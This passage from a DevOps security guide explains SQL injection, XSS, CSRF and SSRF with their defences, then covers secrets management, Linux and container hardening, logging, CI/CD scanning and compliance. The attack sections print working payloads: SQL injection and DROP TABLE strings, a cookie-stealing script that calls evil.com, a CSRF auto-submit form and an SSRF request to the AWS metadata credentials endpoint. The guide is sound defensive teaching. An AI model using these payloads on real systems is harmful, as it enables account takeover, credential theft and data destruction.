SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='anything'
-- The -- comments out the rest. '1'='1' is always true.
-- Returns ALL users — attacker is logged in as the first user (often admin)!
```

Attacker input for username: `'; DROP TABLE users; --`
```sql
SELECT * FROM users WHERE username=''; DROP TABLE users; --' AND password=''
-- Deletes the entire users table!
```

### What Attackers Can Do with SQLi

- **Authentication bypass** — Log in as any user without knowing the password
- **Data exfiltration** — Dump entire database contents (usernames, passwords, credit cards)
- **Data destruction** — DROP tables, DELETE records
- **Privilege escalation** — Execute OS commands via `xp_cmdshell` (SQL Server)
- **Blind SQLi** — Extract data bit by bit via true/false responses even when output is hidden

### Prevention

**1. Parameterized Queries / Prepared Statements (The real fix)**
```python
# Safe code — user input is always treated as DATA, never CODE
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password)
)
# The database knows the query structure upfront — user input can never change it
```

**2. ORMs (Object-Relational Mappers)**
Most modern ORMs (SQLAlchemy, Django ORM, ActiveRecord) use parameterized queries by default.

**3. Input validation**
Validate and sanitize inputs — reject unexpected characters, enforce type and length constraints.

**4. Least privilege**
The database user your app connects as should only have SELECT/INSERT/UPDATE on specific tables — not DROP, CREATE, or system procedures.

**5. WAF (Web Application Firewall)**
A WAF can detect and block SQL injection patterns — but this is a secondary defense, not a substitute for parameterized queries.

```bash
# Test for SQLi (legitimately, on your own systems)
sqlmap -u "http://your-app.com/login" --data "user=test&pass=test" --dbs
```

---

## 14. XSS — Cross-Site Scripting

**XSS** is when an attacker injects malicious JavaScript into a web page that then executes in other users' browsers.

### Types of XSS

**Stored XSS (Persistent):**
Attacker's script is saved to the database and served to every user who views that content.

```
Attacker posts a comment:
"Great article! <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"

Comment is stored in DB. Every user who reads the article executes the script.
The script steals their session cookies and sends them to the attacker's server.
```

**Reflected XSS:**
Malicious script is in the URL — not stored. User must be tricked into clicking a crafted link.

```
https://vulnerable-site.com/search?q=<script>alert(document.cookie)</script>
If the server reflects the query parameter directly into the HTML without escaping,
the script executes in the victim's browser.
```

**DOM-based XSS:**
Vulnerability is entirely in client-side JavaScript — the server's response is never involved. The browser DOM manipulation introduces the vulnerability.

### What Attackers Can Do with XSS

- **Session hijacking** — Steal cookies → take over victim's account
- **Keylogging** — Record keystrokes (capture passwords as user types)
- **Phishing** — Modify page content → fake login form to steal credentials
- **Malware delivery** — Redirect victim to exploit sites
- **CSRF** — Execute actions on behalf of the victim

### Prevention

**1. Output Encoding (Primary defense)**
Every time user-controlled data is rendered in HTML, encode it:
```
<  → &lt;
>  → &gt;
"  → &quot;
'  → &#x27;
&  → &amp;
```

```python
# Bad — raw output
return f"<p>Hello {username}</p>"

# Good — escaped output
from html import escape
return f"<p>Hello {escape(username)}</p>"
```

**2. Content Security Policy (CSP)**
HTTP response header that tells browsers which scripts are allowed to execute:
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
```
Even if an XSS payload is injected, the browser refuses to execute scripts not from approved sources.

**3. HttpOnly and Secure Cookie Flags**
```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```
- `HttpOnly` — JavaScript cannot access this cookie → even if XSS occurs, cannot steal session cookie
- `Secure` — Cookie only sent over HTTPS
- `SameSite` — Cookie not sent with cross-site requests

**4. Modern frontend frameworks**
React, Vue, Angular escape output by default. The real risk is explicit bypasses (`dangerouslySetInnerHTML` in React, `innerHTML` in vanilla JS).

---

## 15. CSRF — Cross-Site Request Forgery

**CSRF** tricks an authenticated user's browser into making an unwanted request to a web application.

### How It Works

You're logged in to your bank at `bank.com`. Your session cookie is automatically attached to every request to `bank.com`.

An attacker creates a malicious page at `evil.com`:
```html
<!-- Hidden image that makes a GET request to bank.com -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none">

<!-- Or a form that auto-submits for POST requests -->
<form action="https://bank.com/transfer" method="POST" id="csrf">
    <input name="to" value="attacker">
    <input name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

When you visit `evil.com`, your browser makes a request to `bank.com` with your session cookie attached (browser automatically sends cookies). From `bank.com`'s perspective, a legitimate authenticated request came in.

### CSRF vs XSS

- **XSS** — Attacker injects code that runs in your browser *on the target site*
- **CSRF** — Attacker tricks your browser into making requests *to the target site from another site*

### Prevention

**1. CSRF Tokens (Primary defense)**
Server generates a unique random token per session. Every state-changing form includes this token as a hidden field. Server validates the token on submission — an attacker can't forge it because they can't read it (same-origin policy).

```html
<form method="POST" action="/transfer">
    <input type="hidden" name="csrf_token" value="random_unique_token_here">
    ...
</form>
```

**2. SameSite Cookie Attribute**
```
Set-Cookie: session=abc; SameSite=Strict
```
- `SameSite=Strict` — Cookie never sent with cross-site requests → CSRF becomes impossible
- `SameSite=Lax` — Cookie sent for top-level navigations but not sub-resources → Partial protection

**3. Checking Origin/Referer Headers**
Server verifies that requests come from the expected origin.

**4. Custom Request Headers**
APIs that require a custom header (like `X-Requested-With: XMLHttpRequest`) are safe from basic CSRF — browsers won't include custom headers in cross-origin requests without CORS permission.

---

## 16. SSRF — Server-Side Request Forgery

**SSRF** tricks a server into making HTTP requests to unintended destinations — including internal services not accessible from the internet.

### How It Works

An app has a feature: "Enter a URL, we'll fetch a preview of that website."

```
User enters: https://external-site.com/image.jpg   → Legitimate
```

Attacker enters:
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

This is AWS's **instance metadata service** (IMDS) — only accessible from within an EC2 instance. The server fetches it and returns the IAM credentials to the attacker!

```json
{
    "AccessKeyId": "ASIA...",
    "SecretAccessKey": "...",
    "Token": "...",
    "Expiration": "2024-01-01T00:00:00Z"
}
```

With those credentials, the attacker now has access to your AWS account.

### What Attackers Can Do with SSRF

- Access AWS/GCP/Azure instance metadata → steal IAM credentials
- Access internal services (databases, admin panels, Kubernetes API)
- Port scan internal network
- Read files on the server via `file://` scheme
- Bypass firewall rules (server is inside the perimeter)

The **2019 Capital One breach** was caused by SSRF — an attacker exploited an SSRF vulnerability to steal AWS credentials from the instance metadata endpoint, then used those to access 100 million customer records.

### Prevention

1. **Validate and restrict URLs** — Only allow specific, known-good domains (whitelist)
2. **Block private IP ranges** — Reject requests to `10.x.x.x`, `172.16.x.x`, `192.168.x.x`, `169.254.x.x`
3. **Use IMDSv2** (AWS) — Requires a session token that can't be requested via SSRF
4. **Egress filtering** — Firewall rules preventing the server from making unexpected outbound connections
5. **Disable unnecessary URL schemes** — Only allow `https://`, not `file://`, `gopher://`, `dict://`

---

## 17. Secrets Management

**Secrets** are sensitive values: passwords, API keys, database credentials, TLS certificates, OAuth client secrets, encryption keys.

### The Cardinal Rule

> **Never commit secrets to version control. Not even once.**

Once a secret is committed to Git — even if you immediately delete it — it's in the history. And once it's on GitHub, it's been scraped by automated bots within seconds.

```bash
# Check if secrets are in Git history
git log -p | grep -i "password\|secret\|api_key\|token"
git log --all --full-history -- "*.pem"

# Use git-secrets to prevent commits with secrets
git secrets --install
git secrets --scan
```

### Where Secrets Must NOT Live

- ❌ Hardcoded in source code
- ❌ In `.env` files committed to Git
- ❌ In Docker images
- ❌ In Kubernetes manifests in plain text
- ❌ In CI/CD pipeline logs
- ❌ In application logs
- ❌ In environment variable printouts

### Where Secrets Should Live

**1. Environment Variables (minimum baseline)**
Not great — processes can inspect each other's environment in some cases, they get logged accidentally. But better than hardcoded.

```bash
# Inject at runtime, not in code
DATABASE_PASSWORD=secret ./app
# Or via systemd:
# EnvironmentFile=/etc/app/secrets.env  (with restricted permissions: chmod 600)
```

**2. HashiCorp Vault**
Purpose-built secrets management:
- Secrets encrypted at rest
- Fine-grained access control
- Audit log of every secret access
- Dynamic secrets (generates DB credentials on-demand, auto-rotates)
- Lease-based — credentials expire automatically

```bash
vault kv put secret/myapp/database password="supersecret"
vault kv get secret/myapp/database
# Application reads via Vault API or agent sidecar
```

**3. Cloud Provider Secret Services**
- **AWS Secrets Manager** — Stores, rotates, and manages access to secrets
- **AWS Parameter Store** — Simpler, cheaper, good for config + secrets
- **GCP Secret Manager** — Google's equivalent
- **Azure Key Vault** — Microsoft's equivalent

```bash
# AWS Secrets Manager
aws secretsmanager get-secret-value --secret-id prod/myapp/database

# AWS Parameter Store
aws ssm get-parameter --name /prod/myapp/db_password --with-decryption
```

**4. Kubernetes Secrets**
```yaml
# k8s Secret (base64 encoded — NOT encrypted by default!)
apiVersion: v1
kind: Secret
metadata:
  name: db-credentials
type: Opaque
data:
  password: c3VwZXJzZWNyZXQ=   # base64("supersecret")
```

⚠️ Kubernetes secrets are base64-encoded, not encrypted. Enable **etcd encryption at rest** and use **Sealed Secrets** or an external vault for production.

### Secrets Rotation

Secrets should be rotated (changed) regularly:
- Database passwords: Every 90 days (or automated by Vault/Secrets Manager)
- API keys: Every 90 days or immediately if suspected compromise
- TLS certificates: Before expiry (Let's Encrypt auto-renews every 90 days)
- SSH keys: Annually, or when a team member leaves

**Immediately rotate** any secret that might be compromised (committed to Git, exposed in logs, held by a departing employee).

### Detecting Secrets in Code

```bash
# truffleHog — scans Git history for secrets
trufflehog git https://github.com/your-org/your-repo

# detect-secrets — pre-commit hook
detect-secrets scan > .secrets.baseline
detect-secrets audit .secrets.baseline

# gitleaks
gitleaks detect --source . --verbose
```

---

## 18. Linux System Security

### User and Permission Hardening

```bash
# Find files with no owner (orphaned files — potential issue)
find / -nouser -o -nogroup 2>/dev/null

# Find SUID/SGID files (potential privilege escalation vectors)
find / -perm -4000 -type f 2>/dev/null   # SUID files
find / -perm -2000 -type f 2>/dev/null   # SGID files

# World-writable files (any user can modify — dangerous)
find / -perm -0002 -type f 2>/dev/null

# Files writable by group (check if expected)
find /etc -perm -g+w -type f 2>/dev/null

# Lock unused accounts
passwd -l username         # Lock account
usermod --expiredate 1 username  # Expire account immediately
```

### sudo Hardening

```bash
# Always edit sudoers with visudo (validates syntax — prevents lockout)
visudo

# Good sudoers practices:
# Specific commands only (not ALL)
deploy ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart myapp

# Require password even for specific commands
alice ALL=(ALL) /usr/bin/apt

# Log all sudo usage (usually automatic, verify in /var/log/auth.log)
cat /var/log/auth.log | grep sudo
journalctl | grep sudo
```

### File Integrity Monitoring

**AIDE (Advanced Intrusion Detection Environment)** creates a database of file hashes and metadata. Run it periodically to detect unauthorized modifications.

```bash
aide --init         # Create initial database
aide --check        # Compare current state to baseline — show changes
```

### auditd — The Linux Audit System

`auditd` logs security-relevant events at the kernel level — who read what file, who executed what command, who changed what user's password.

```bash
# Install and start
apt install auditd
systemctl enable auditd --now

# Add audit rules
auditctl -w /etc/passwd -p wa -k passwd_changes   # Watch for writes to /etc/passwd
auditctl -w /etc/sudoers -p wa -k sudoers_changes
auditctl -a always,exit -F arch=b64 -S execve -k command_exec   # Log all command executions

# Search audit logs
ausearch -k passwd_changes
ausearch -k command_exec --start today
```

### CIS Benchmarks

The **Center for Internet Security (CIS)** publishes hardening guides for every major OS and application. These are the industry standard for system security configuration.

```bash
# CIS benchmark checker tools
# Lynis — security auditing tool
lynis audit system   # Scans and gives a hardening score with recommendations

# OpenSCAP — compliance checking
oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_cis \
    /usr/share/xml/scap/ssg/content/ssg-rhel8-ds.xml
```

### SELinux and AppArmor

These are **Mandatory Access Control (MAC)** systems that enforce security policies beyond normal Unix permissions.

**SELinux (RHEL/CentOS/Fedora):**
- Every process and file has a **security label/context**
- Policy defines which contexts can interact with which
- Even root is constrained by SELinux policy

```bash
getenforce          # Enforcing / Permissive / Disabled
sestatus            # Detailed SELinux status
ls -Z /etc/passwd   # Show SELinux context of files
ps auxZ | grep httpd  # Show process contexts
# If SELinux is blocking something:
ausearch -m AVC -ts recent   # Show SELinux denials
sealert -a /var/log/audit/audit.log  # Human-readable policy violation explanations
```

**AppArmor (Ubuntu/Debian):**
- Profiles restrict what specific programs can do
- Easier to configure than SELinux

```bash
aa-status           # Show AppArmor status and loaded profiles
aa-enforce /etc/apparmor.d/usr.sbin.nginx   # Put nginx profile into enforce mode
```

---

## 19. Network Security

### Port Scanning — Know What's Exposed

```bash
# Scan your own server to see what's exposed to the internet
nmap -sV -p- your-server-ip              # All ports, version detection
nmap -sV --script vuln your-server-ip    # Vulnerability scanning scripts
nmap -sU -p 53,67,68,123 your-server-ip  # UDP ports

# Check what's listening locally
ss -tlnp    # All listening TCP ports with processes
ss -ulnp    # All listening UDP ports
```

### DDoS — Distributed Denial of Service

A **DDoS attack** sends massive amounts of traffic to overwhelm a server or network, making it unavailable.

**Types:**
- **Volumetric:** Floods bandwidth with garbage traffic (UDP floods, ICMP floods)
- **Protocol:** Exploits protocol weaknesses (SYN flood — fills connection table)
- **Application (L7):** HTTP floods — millions of legitimate-looking requests

**SYN Flood:**
Attacker sends millions of SYN packets (TCP handshake initiation) with spoofed source IPs. Server responds with SYN-ACK for each, fills the half-open connection table, can't accept real connections.

```bash
# SYN flood protection via SYN cookies
sysctl -w net.ipv4.tcp_syncookies=1   # Enable SYN cookies (usually on by default)
```

**Defenses:**
- **Upstream scrubbing:** ISP/CDN filters attack traffic before it reaches you
- **Anycast:** Distribute traffic across many nodes globally (Cloudflare, AWS Shield)
- **Rate limiting:** Block IPs sending too many requests
- **CDN:** Cloudflare/Fastly absorbs L7 DDoS

### MITM — Man-in-the-Middle Attack

An attacker positions themselves between client and server, intercepting and potentially modifying all communication.

Attack vectors:
- **ARP poisoning** — Poisons ARP cache to redirect traffic through attacker
- **DNS spoofing** — Fake DNS responses redirect users to attacker's server
- **Rogue Wi-Fi** — Attacker creates fake "Starbucks WiFi" — controls all traffic
- **BGP hijacking** — Attacker announces more specific routes to steal internet traffic

**Defenses:** HTTPS/TLS (encrypts and authenticates), HSTS (forces HTTPS), certificate pinning, VPN on untrusted networks.

### Network Segmentation

Divide your network into zones with different trust levels. Limit traffic between zones.

```
Internet
    ↓ (DMZ — De-Militarized Zone)
Load Balancer / Web Server
    ↓ (application tier — limited access from DMZ)
Application Server
    ↓ (database tier — only application server can connect)
Database Server
```

A breach in the DMZ doesn't automatically grant access to the database tier. Each crossing requires explicit firewall rules.

---

## 20. Container & Kubernetes Security

### Docker Security

**Don't run containers as root:**
```dockerfile
# Bad
FROM ubuntu:22.04
RUN npm install
CMD ["node", "app.js"]   # Runs as root inside container

# Good
FROM ubuntu:22.04
RUN useradd -m -u 1001 appuser
USER appuser
CMD ["node", "app.js"]   # Runs as non-root
```

**Use minimal base images:**
```dockerfile
# Bad — Ubuntu has hundreds of packages, huge attack surface
FROM ubuntu:22.04

# Better — Alpine Linux is ~5MB with minimal packages
FROM alpine:3.19

# Best — Distroless (no shell, no package manager, only runtime)
FROM gcr.io/distroless/nodejs:18
```

**Read-only root filesystem:**
```bash
docker run --read-only myapp
# App can't write to filesystem at all — must mount specific writable volumes
```

**Drop capabilities:**
```bash
# Drop all capabilities, add only what's needed
docker run --cap-drop ALL --cap-add NET_BIND_SERVICE myapp
```

**Scan images for vulnerabilities:**
```bash
trivy image nginx:latest          # Scan for CVEs in image
grype nginx:latest                # Alternative scanner
docker scout cves nginx:latest    # Docker's built-in scanner
```

### Kubernetes Security

**RBAC (Role-Based Access Control):**
```yaml
# Don't give wildcards — be specific
# Bad:
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]

# Good:
rules:
- apiGroups: ["apps"]
  resources: ["deployments"]
  verbs: ["get", "list", "watch"]
```

**Network Policies:**
By default, all pods can communicate with all other pods. Network Policies restrict this:
```yaml
# Only allow frontend pods to connect to backend on port 8080
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: backend-policy
spec:
  podSelector:
    matchLabels:
      app: backend
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - port: 8080
```

**Security Contexts:**
```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 1001
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  capabilities:
    drop: ["ALL"]
```

**Secrets — use external storage:**
- Native Kubernetes secrets are base64-encoded (not encrypted by default)
- Use: AWS Secrets Manager + External Secrets Operator, HashiCorp Vault + Vault Agent Injector, or Sealed Secrets

---

## 21. Logging, Auditing & Monitoring for Security

Security without visibility is blind faith. You need to log, monitor, and alert on suspicious activity.

### What to Log

```
Authentication events:
  - Successful logins (with source IP)
  - Failed login attempts (especially repeated failures)
  - Password changes
  - MFA failures

Authorization events:
  - Access denied events (someone tried to do something they couldn't)
  - Privilege escalation (sudo usage)

Data access:
  - Who accessed what sensitive data and when
  - Bulk data exports

System events:
  - New process execution
  - File changes in sensitive paths (/etc, /bin, /sbin)
  - Network connections to unexpected destinations
  - New listening ports

Application errors:
  - Unhandled exceptions
  - Unusual error rates
```

### Log Security Best Practices

- **Never log passwords, tokens, or secrets** — even in debug mode
- **Never log full credit card numbers** — log last 4 digits only
- **Send logs to a central, write-once log server** — so attackers can't delete evidence
- **Keep logs for 90 days minimum** (often regulatory requirements say 1 year)
- **Alert on anomalies** — 100 failed logins in 5 minutes = brute force attack

### SIEM — Security Information and Event Management

A **SIEM** collects logs from all sources, correlates events, and generates alerts.

```
All servers, apps, network devices
           ↓
    Log Aggregation (Fluentd, Filebeat)
           ↓
    SIEM (Splunk, ELK Stack, Datadog Security)
           ↓
    Correlation Rules + Anomaly Detection
           ↓
    Alerts → Security team
```

### Detecting Common Attacks in Logs

**Brute force SSH:**
```bash
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr | head
# Shows IPs with most failed attempts
```

**Successful login after many failures (credential stuffing success):**
```bash
# Look for: many failures from one IP, followed by success
grep "192.168.1.100" /var/log/auth.log | grep -E "Failed|Accepted"
```

**Web application scanning:**
```bash
# Lots of 404s from one IP = someone probing for vulnerabilities
awk '{print $1, $9}' /var/log/nginx/access.log | grep " 404" | awk '{print $1}' | sort | uniq -c | sort -nr
```

**fail2ban — Automated IP blocking:**
```bash
# fail2ban reads logs and blocks IPs that trigger rules
apt install fail2ban

# Configure SSH protection
# /etc/fail2ban/jail.local:
[sshd]
enabled = true
maxretry = 5
bantime = 3600    # Ban for 1 hour

# Check banned IPs
fail2ban-client status sshd
```

---

## 22. Security in CI/CD Pipelines

Your CI/CD pipeline is a high-privilege system — it deploys to production. Compromising it means compromising everything it touches.

### Pipeline Security Principles

**Treat pipeline code like production code:**
- Review changes to pipeline configuration files (`.github/workflows/`, `Jenkinsfile`, `.gitlab-ci.yml`)
- Don't allow unreviewed code to run in privileged contexts

**Least privilege for CI/CD credentials:**
```yaml
# GitHub Actions — use OIDC, not long-lived keys
permissions:
  id-token: write   # For OIDC
  contents: read    # Only what's needed
```

**Pin dependency versions:**
```yaml
# Bad — uses whatever is "latest" today (could be compromised tomorrow)
- uses: actions/checkout@main

# Good — pin to specific commit hash
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
```

**Secrets in CI/CD:**
- Use the CI platform's built-in secrets management (GitHub Secrets, GitLab Variables)
- Never print secrets in logs (they get masked — but understand why)
- Use OIDC to avoid long-lived credentials entirely

### SAST — Static Application Security Testing

**SAST** analyzes source code without running it — looks for security vulnerabilities, hardcoded secrets, dangerous patterns.

```bash
# Semgrep — fast, powerful SAST
semgrep --config=p/security-audit .

# Bandit — Python security scanner
bandit -r ./myapp/

# SonarQube — comprehensive code quality + security
# (runs as a service, integrates with CI)
```

### DAST — Dynamic Application Security Testing

**DAST** tests a running application — sends malicious inputs, looks for vulnerabilities.

```bash
# OWASP ZAP — industry standard DAST tool
# Run as part of CI against staging environment
docker run -t owasp/zap2docker-stable zap-baseline.py -t http://staging.example.com
```

### SCA — Software Composition Analysis

**SCA** scans your dependencies for known vulnerabilities.

```bash
# npm audit — Node.js
npm audit
npm audit fix    # Auto-fix where possible

# Safety — Python
pip install safety
safety check

# OWASP Dependency-Check
dependency-check.sh --project myapp --scan ./ --out ./report

# Snyk — multi-language
snyk test
snyk monitor
```

### Supply Chain Security

The **SolarWinds attack** and **Log4Shell** showed that your code security is only as good as your dependencies.

- **Pin dependency versions** — don't use floating versions like `>=1.0`
- **Use a lock file** — `package-lock.json`, `Pipfile.lock`, `go.sum`
- **Verify checksums** — verify downloaded packages match expected hashes
- **Use trusted registries** — private npm/PyPI mirrors, scan before use
- **SBOM (Software Bill of Materials)** — document every dependency and version

---

## 23. Compliance Concepts — OWASP, CIS, SOC2

### OWASP

The **Open Web Application Security Project** is a non-profit that produces free resources on web application security.

Key resources:
- **OWASP Top 10:** Most critical web application security risks — updated every few years
- **OWASP API Security Top 10:** Same for APIs
- **OWASP Testing Guide:** How to test for each vulnerability
- **OWASP ASVS (Application Security Verification Standard):** Security requirements framework

### CIS — Center for Internet Security

**CIS Benchmarks** are detailed, consensus-based configuration guides for secure system setup. Available for every major OS (Linux, Windows, macOS), cloud platforms (AWS, Azure, GCP), and applications (nginx, MySQL, Docker, Kubernetes).

**CIS Controls** are 18 prioritized actions to defend against the most common attacks:
- CIS Control 1: Inventory of Enterprise Assets
- CIS Control 2: Inventory of Software Assets
- CIS Control 3: Data Protection
- CIS Control 5: Account Management
- CIS Control 6: Access Control Management
- ...

### SOC 2

**SOC 2 (Service Organization Control 2)** is an auditing standard that verifies an organization's controls related to:
- **Security** (Common Criteria)
- **Availability**
- **Processing Integrity**
- **Confidentiality**
- **Privacy**

**Type 1:** Snapshot — "controls are designed correctly at this point in time"
**Type 2:** Period — "controls operated effectively over a period (typically 6-12 months)"

As a DevOps engineer, SOC 2 compliance means:
- All infrastructure changes must go through change management
- Access is reviewed and logged
- Vulnerabilities are patched within defined SLAs
- Encryption in transit and at rest
- Backup and recovery procedures exist and are tested

### Other Compliance Frameworks

| Framework | Focus | Who it applies to |
|---|---|---|
| **PCI DSS** | Payment card data security | Anyone storing/processing credit cards |
| **HIPAA** | Healthcare data (US) | Healthcare companies, their vendors |
| **GDPR** | EU personal data | Any company with EU users |
| **ISO 27001** | Information security management system | General — any organization |
| **FedRAMP** | Cloud security for US government | Cloud providers serving US government |
| **NIST CSF** | Cybersecurity framework | US organizations, widely adopted |

---

## 24. Quick Reference Cheat Sheet

### Cryptography Quick Reference
```
Symmetric:   AES-256-GCM (data encryption)
Asymmetric:  RSA-4096 or Ed25519 (key exchange, signatures)
Hashing:     SHA-256 (data integrity), Argon2/bcrypt (passwords)
HMAC:        HMAC-SHA256 (message authentication)
TLS:         1.2 minimum, 1.3 preferred
```

### Certificate Tools
```bash
openssl x509 -in cert.pem -noout -text          # Read certificate
openssl x509 -in cert.pem -noout -enddate        # Check expiry
openssl s_client -connect host:443               # Test TLS handshake
openssl req -new -newkey rsa:2048 -nodes \
    -keyout key.pem -out csr.pem                 # Generate CSR
certbot renew --dry-run                          # Test cert renewal
```

### SSH Security
```bash
ssh-keygen -t ed25519                            # Generate strong key
ssh-copy-id user@server                          # Copy key to server
cat /etc/ssh/sshd_config | grep -E "PermitRoot|PasswordAuth"
journalctl -u sshd | grep "Failed\|Accepted"    # SSH auth events
```

### Secret Detection
```bash
git log -p | grep -i "password\|secret\|key\|token"
trufflehog git https://github.com/org/repo
gitleaks detect --source .
```

### Security Scanning
```bash
nmap -sV your-server                             # Port scan
trivy image myapp:latest                         # Container CVE scan
npm audit                                        # Node.js dependency audit
bandit -r ./app/                                 # Python SAST
lynis audit system                               # Linux security audit
```

### Firewall
```bash
iptables -L -n -v                                # View rules
ufw status verbose                               # UFW status
ss -tlnp                                         # What's listening
fail2ban-client status                           # Banned IPs
```

### Audit & Monitoring
```bash
last                                             # Recent login history
lastfail / faillog                               # Failed login attempts
grep "sudo" /var/log/auth.log                    # sudo usage
ausearch -m AVC -ts recent                       # SELinux denials
journalctl -u sshd -f                            # Live SSH log
```

---

## Security Concepts Map

```
IDENTITY
  Authentication (who are you?)
    → Passwords + Hashing (bcrypt/Argon2)
    → SSH Keys (Ed25519)
    → MFA (TOTP, hardware tokens)
    → OAuth2 / OIDC (federated identity)
  Authorization (what can you do?)
    → RBAC / ABAC / ACL
    → Least Privilege
    → JWT (carries claims)

DATA PROTECTION
  In transit  → TLS 1.3 (encryption + authentication + integrity)
  At rest     → AES-256 encryption
  In code     → Never — secrets management (Vault, Secrets Manager)

SYSTEM SECURITY
  OS          → Patch management, minimal services, auditd, SELinux/AppArmor
  Network     → Firewalls, segmentation, IDS/IPS
  Containers  → Non-root, read-only FS, minimal images, scanning
  CI/CD       → SAST, DAST, SCA, secrets management, OIDC

ATTACK AWARENESS
  Injection   → SQLi, Command injection — use parameterized queries
  XSS         → Output encoding, CSP, HttpOnly cookies
  CSRF        → CSRF tokens, SameSite cookies
  SSRF        → URL validation, block private IPs
  Secrets     → Never in code, rotate regularly, detect leaks

MONITORING
  Logs        → Centralized, tamper-proof, 90+ days retention
  Audit       → auditd, access logs, change logs
  Alerts      → Brute force, anomalous access, CVEs
  Response    → Incident response plan, fail2ban
```

---

*Document version 1.0 — Security Fundamentals for DevOps Engineers. Use alongside OS Fundamentals and Networking Fundamentals for a complete foundation.*
